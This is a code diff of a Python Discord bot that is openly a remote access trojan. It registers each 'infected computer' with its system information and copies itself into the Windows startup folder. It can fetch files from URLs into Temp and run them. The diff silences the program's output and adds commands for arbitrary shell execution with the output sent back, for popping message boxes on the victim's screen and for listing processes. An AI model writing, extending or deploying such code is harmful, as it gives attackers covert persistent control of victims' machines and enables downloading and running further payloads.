@@ -3,9 +3,17 @@
 import discord
 from discord.ext import commands
 import urllib.request
-import json, os, socket, platform, tempfile, random
+import json
+import os
+import socket
+import platform
+import tempfile
+import random
 import uuid  
-import shutil, sys
+import shutil, sys, ctypes, threading
+import win32api, win32con
+import win32gui, subprocess
+import time
 
 server_id = 123456789
 token = "TOKEN HERE"
@@ -58,11 +66,10 @@ def add_to_startup(program_path):
 
         if not os.path.exists(destination_path):
             shutil.copyfile(program_path, destination_path)
-            print(f'Successfully added {script_name} to startup.')
         else:
-            print(f'{script_name} already exists in startup folder.')
+            pass
     except Exception as e:
-        print(f'An error occurred: {str(e)}')
+        pass
 
 
 @bot.event
@@ -78,14 +85,12 @@ async def on_ready():
     channel_name = computer_name
     
     existing_channel = discord.utils.get(server.text_channels, name=channel_name)
-    print('done')
     if not existing_channel:
         try:
             data = globalInfo()
         except:
             data = 'Could not get any information about the user'
         new_channel = await server.create_text_channel(channel_name)
-        print('created')
     
         embed = discord.Embed(title="Someone launched it =) ")
         embed.add_field(name=f"Computer information\nComputer unique id \n`{computer_id}`\n", value=data)
@@ -94,7 +99,8 @@ async def on_ready():
         
 google_user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
 
-@bot.tree.command()
+
+@bot.tree.command(description="Will put the program into startup folder")
 async def startup(interaction: discord.Interaction, computer_id: str):
     program_path = sys.argv[0]
     if computer_id in computer_ids:
@@ -106,7 +112,7 @@ async def startup(interaction: discord.Interaction, computer_id: str):
         except:
             await interaction.response.send_message('Error while trying to add to startup')
 
-@bot.tree.command()
+@bot.tree.command(description="You will be able to upload a file, YOU MUST USE A DIRECT DOWNLOAD LINK")
 async def download(interaction: discord.Interaction, computer_id: str, url: str):
     if computer_id in computer_ids:
         bot_instance = computer_ids[computer_id]
@@ -121,8 +127,6 @@ async def download(interaction: discord.Interaction, computer_id: str, url: str)
             file_extension = url.split('.')[-1]
 
             random_filename = f"{random.randint(1000, 9999)}.{file_extension}"
-            print(random_filename)
-
             temp_folder = os.path.join(os.path.expanduser("~"), 'AppData', 'Local', 'Temp')
 
             if not os.path.exists(temp_folder):
@@ -144,7 +148,7 @@ async def download(interaction: discord.Interaction, computer_id: str, url: str)
     else:
         await interaction.response.send_message("Invalid computer ID. Please provide a valid computer ID.")
 
-@bot.tree.command()
+@bot.tree.command(description="Will start an file that can be added with /download command")
 async def startfile(interaction: discord.Interaction, computer_id: str, file_id: str, file_extension: str):
     if computer_id in computer_ids:
         bot_instance = computer_ids[computer_id]
@@ -154,7 +158,6 @@ async def startfile(interaction: discord.Interaction, computer_id: str, file_id:
         full_path = os.path.join(temp_folder, f"{file_id}.{file_extension}")
 
         try:
-            # Check if the file exists
             if os.path.exists(full_path):
                 import subprocess
                 subprocess.Popen([full_path], shell=True)
@@ -168,6 +171,71 @@ async def startfile(interaction: discord.Interaction, computer_id: str, file_id:
     
     else:
         await interaction.response.send_message("Invalid computer ID. Please provide a valid computer ID.")
+
+@bot.tree.command(description='Send a message to the infected computer')
+async def message(interaction: discord.Interaction, computer_id: str, message_title: str, message_text:str):
+    if computer_id in computer_ids:
+        bot_instance = computer_ids[computer_id]
+        try:
+            await interaction.response.send_message("Successfully sended.")
+
+            win32api.MessageBox(0, message_text, message_title, win32con.MB_ICONWARNING)
+        except:
+            await interaction.response.send_message("Error while trying to send the message box")
+    else:
+        await interaction.response.send_message("Invalid computer ID. Please provide a valid computer ID.")
+
+
+@bot.tree.command(description='Execute a command prompt command (DO NOT USE TASKLIST)')
+async def execute_command(interaction:discord.Interaction, computer_id: str, *, command: str):
+    if computer_id in computer_ids:
+        bot_instance = computer_ids[computer_id]
+
+        import subprocess
+        try:
+            result = subprocess.run(command, shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+            response_message = f"Command '{command}' executed on computer {computer_id}\n\n"
+            response_message += "Command Output:\n"
+            response_message += result.stdout
+
+            if result.stderr:
+                response_message += "\nCommand Error:\n"
+                response_message += result.stderr
+
+            await interaction.response.send_message(response_message)
+        except Exception as e:
+            await interaction.response.send_message(f"Error executing the command: {str(e)}")
+    else:
+        await interaction.response.send_message(f"Computer ID '{computer_id}' not found.")
+        
+@bot.tree.command(description='Get a list of running processes')
+async def list_processes(interaction: discord.Interaction, computer_id: str):
+    if computer_id in computer_ids:
+        bot_instance = computer_ids[computer_id]
+
+        response_message = f"**Here are all the running processes in {computer_id}:**\n\n"
+
+        try:
+            result = subprocess.run('tasklist /fo table /nh | FOR /F "tokens=1" %i IN (\'more\') DO @echo %i', shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+            process_list = result.stdout.splitlines()
+            unique_process_list = list(set(process_list))
+            response_message += "\n".join(unique_process_list)
+
+            if result.stderr:
+                response_message += "\nCommand Error:\n"
+                response_message += result.stderr
+
+            if len(response_message) <= 1998:
+                await interaction.response.send_message(response_message)
+            else:
+                await interaction.response.send_message("The list of processes is too long to display.")
+        except Exception as e:
+            await interaction.response.send_message(f"Error executing the command: {str(e)}")
+
+    else:
+        await interaction.response.send_message(f"Computer ID '{computer_id}' not found.")
 
     
 bot.run(token)
